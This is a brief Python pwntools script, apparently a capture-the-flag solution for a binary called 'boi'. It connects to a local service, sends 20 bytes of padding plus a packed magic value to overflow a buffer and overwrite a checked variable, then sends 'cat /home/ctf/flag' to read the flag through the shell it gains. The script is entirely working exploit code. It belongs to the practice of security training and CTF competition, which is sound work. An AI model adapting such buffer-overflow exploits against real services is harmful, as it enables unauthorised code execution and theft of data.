#!/usr/bin/env python

from pwn import *

r = remote('127.0.1.1', 13337)
# r = process('boi')
# raw_input()

r.sendline('A'*20 + p32(0xcaf3baee))
r.sendline('cat /home/ctf/flag')
print r.recv()
